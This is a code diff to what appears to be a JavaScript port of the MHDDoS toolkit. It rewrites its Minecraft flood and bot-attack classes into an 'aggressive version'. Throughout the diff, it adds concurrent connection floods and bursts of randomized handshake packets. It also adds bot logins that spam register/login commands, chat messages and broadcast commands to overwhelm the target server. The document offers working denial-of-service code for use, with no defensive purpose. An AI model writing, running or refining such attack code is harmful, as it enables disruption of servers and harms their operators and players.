@@ -78,7 +78,7 @@ class MinecraftProtocol {
 }
 
 /**
- * Minecraft Server Attack
+ * Minecraft Server Attack - IMPROVED AGGRESSIVE VERSION
  */
 export class MinecraftFlood {
     constructor(target, port, duration, protocol = 47, proxies = null) {
@@ -94,14 +94,20 @@ export class MinecraftFlood {
         const endTime = Date.now() + (this.duration * 1000);
 
         while (Date.now() < endTime && this.active) {
-            await this.attack();
+            // Create multiple connections simultaneously for more aggressive attack
+            const connections = [];
+            for (let i = 0; i < 10; i++) {
+                connections.push(this.attack());
+            }
+            await Promise.allSettled(connections);
         }
     }
 
     async attack() {
         return new Promise((resolve) => {
             const socket = new net.Socket();
-            socket.setTimeout(900);
+            socket.setTimeout(500); // Faster timeout
+            socket.setNoDelay(true); // Disable Nagle's algorithm for faster sending
 
             const handshake = MinecraftProtocol.handshake(
                 this.target,
@@ -112,22 +118,33 @@ export class MinecraftFlood {
             const ping = MinecraftProtocol.data(Buffer.from([0x00]));
 
             socket.connect(this.port, this.target, () => {
+                let packetCount = 0;
+                const maxPackets = 1000; // Send 1000 packets per connection
+
                 const sendData = () => {
-                    if (!this.active) {
+                    if (!this.active || packetCount >= maxPackets) {
                         Tools.safeClose(socket);
                         resolve();
                         return;
                     }
 
-                    const sent1 = Tools.send(socket, handshake);
-                    const sent2 = Tools.send(socket, ping);
-                    
-                    if (sent1 && sent2) {
-                        setImmediate(sendData);
-                    } else {
-                        Tools.safeClose(socket);
-                        resolve();
+                    // Send multiple packets at once for amplification
+                    for (let i = 0; i < 50; i++) {
+                        if (!this.active) break;
+                        Tools.send(socket, handshake);
+                        Tools.send(socket, ping);
+                        // Send random handshakes with different versions to confuse server
+                        const randomHandshake = MinecraftProtocol.handshake(
+                            Tools.randomString(10) + '.' + this.target,
+                            this.port,
+                            Tools.randomInt(47, 763), // Random protocol versions
+                            Tools.randomInt(1, 2)
+                        );
+                        Tools.send(socket, randomHandshake);
+                        packetCount += 3;
                     }
+                    
+                    setImmediate(sendData);
                 };
 
                 sendData();
@@ -151,7 +168,7 @@ export class MinecraftFlood {
 }
 
 /**
- * Minecraft Bot Attack (MCBOT)
+ * Minecraft Bot Attack (MCBOT) - IMPROVED AGGRESSIVE VERSION
  */
 export class MinecraftBot {
     constructor(target, port, duration, protocol = 47, botPrefix = 'MHDDoS_') {
@@ -167,17 +184,23 @@ export class MinecraftBot {
         const endTime = Date.now() + (this.duration * 1000);
 
         while (Date.now() < endTime && this.active) {
-            await this.attack();
+            // Spawn multiple bots simultaneously
+            const bots = [];
+            for (let i = 0; i < 5; i++) {
+                bots.push(this.attack());
+            }
+            await Promise.allSettled(bots);
         }
     }
 
     async attack() {
         return new Promise((resolve) => {
             const socket = new net.Socket();
-            socket.setTimeout(2000);
+            socket.setTimeout(3000);
+            socket.setNoDelay(true);
 
-            const username = this.botPrefix + Tools.randomString(5);
-            const password = Buffer.from(username).toString('base64').substring(0, 8);
+            const username = this.botPrefix + Tools.randomString(8);
+            const password = Tools.randomString(12);
 
             const handshake = MinecraftProtocol.handshake(
                 this.target,
@@ -191,33 +214,52 @@ export class MinecraftBot {
                 Tools.send(socket, handshake);
                 Tools.send(socket, login);
 
-                await Tools.sleep(1500);
+                await Tools.sleep(800); // Faster connection
 
-                Tools.send(socket, MinecraftProtocol.chat(
-                    this.protocol,
-                    `/register ${password} ${password}`
-                ));
-                Tools.send(socket, MinecraftProtocol.chat(
-                    this.protocol,
-                    `/login ${password}`
-                ));
+                // Spam register/login commands
+                for (let i = 0; i < 10; i++) {
+                    Tools.send(socket, MinecraftProtocol.chat(this.protocol, `/register ${password} ${password}`));
+                    Tools.send(socket, MinecraftProtocol.chat(this.protocol, `/login ${password}`));
+                    Tools.send(socket, MinecraftProtocol.chat(this.protocol, `/register ${password}`));
+                }
+
+                let chatCount = 0;
+                const maxChats = 500; // Send more messages
 
                 const spamChat = () => {
-                    if (!this.active) {
+                    if (!this.active || chatCount >= maxChats) {
                         Tools.safeClose(socket);
                         resolve();
                         return;
                     }
 
-                    const message = Tools.randomString(256);
-                    const sent = Tools.send(socket, MinecraftProtocol.chat(this.protocol, message));
-
-                    if (sent) {
-                        setTimeout(spamChat, 1100);
-                    } else {
-                        Tools.safeClose(socket);
-                        resolve();
+                    // Send multiple messages at once
+                    for (let i = 0; i < 20; i++) {
+                        if (!this.active) break;
+                        
+                        // Random spam messages and commands
+                        const messages = [
+                            Tools.randomString(256),
+                            `/help`,
+                            `/list`,
+                            `/msg @a ${Tools.randomString(100)}`,
+                            `/tell @p ${Tools.randomString(100)}`,
+                            `/say ${Tools.randomString(200)}`,
+                            `/me ${Tools.randomString(150)}`,
+                            Tools.randomString(256).repeat(3) // Extra long messages
+                        ];
+                        
+                        const msg = Tools.randomChoice(messages);
+                        Tools.send(socket, MinecraftProtocol.chat(this.protocol, msg));
+                        
+                        // Also send keep-alive packets to stay connected longer
+                        Tools.send(socket, MinecraftProtocol.keepalive(this.protocol, Date.now()));
+                        
+                        chatCount++;
                     }
+
+                    // Faster spam rate
+                    setTimeout(spamChat, 200);
                 };
 
                 spamChat();
